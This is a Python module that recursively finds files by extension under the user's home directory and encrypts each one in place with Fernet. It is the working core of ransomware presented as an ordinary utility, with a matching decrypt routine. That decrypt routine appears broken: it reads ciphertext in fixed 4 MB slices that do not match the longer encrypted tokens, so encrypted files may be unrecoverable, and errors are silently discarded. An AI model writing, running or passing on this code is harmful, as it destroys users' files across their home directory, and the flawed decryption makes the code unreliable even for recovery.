import os
import mmap
import shutil
from pathlib import Path
from typing import Dict, List

from lib.modules.yaml import safe_load
from lib.cryptography.fernet import Fernet


def List_Files() -> Dict[str, List[str]]:
    """
    Lists files in the user's home directory categorized by file extension.

    Returns:
        Dict[str, List[str]]: A dictionary where keys are file extensions and values are lists of file paths.
    """
    with open('scripts/extensions.yaml', 'r') as file:
        exts = safe_load(file)

    file_categories: Dict[str, List[str]] = {category: [] for category in exts}
    extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}

    for entry in Path.home().rglob('*'):
        if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
            file_categories[extcategory[ext]].append(str(entry))

    return file_categories


def Process_Files(Private: Fernet, mode: str) -> None:
    """
    Encrypts or decrypts files based on the specified mode.

    Args:
        Private (Fernet): An instance of the Fernet class.
        mode (str): Either 'encrypt' or 'decrypt'.
    """
    for _, files in List_Files().items():
        for file in files:
            temp_file = file + '.temp'
            try:
                with open(file, 'rb') as original_file, open(temp_file, 'wb', buffering=4096*1024) as temp_file:
                    with mmap.mmap(original_file.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                        offset = 0
                        while offset < len(mm):
                            chunk = mm[offset:offset + 4096 * 1024]
                            if not chunk:
                                break
                            processed_chunk = Private.encrypt(chunk) if mode == 'encrypt' else Private.decrypt(chunk)
                            temp_file.write(processed_chunk)
                            offset += len(chunk)
                shutil.move(temp_file.name, file)
            except Exception:
                if os.path.exists(temp_file.name):
                    os.remove(temp_file.name)


def Encrypt(Private: Fernet) -> None:
    """
    Encrypts files using Fernet encryption.

    Args:
        Private (Fernet): An instance of the Fernet class.
    """
    Process_Files(Private, 'encrypt')


def Decrypt(Private: Fernet) -> None:
    """
    Decrypts files using Fernet decryption.

    Args:
        Private (Fernet): An instance of the Fernet class.
    """
    Process_Files(Private, 'decrypt')
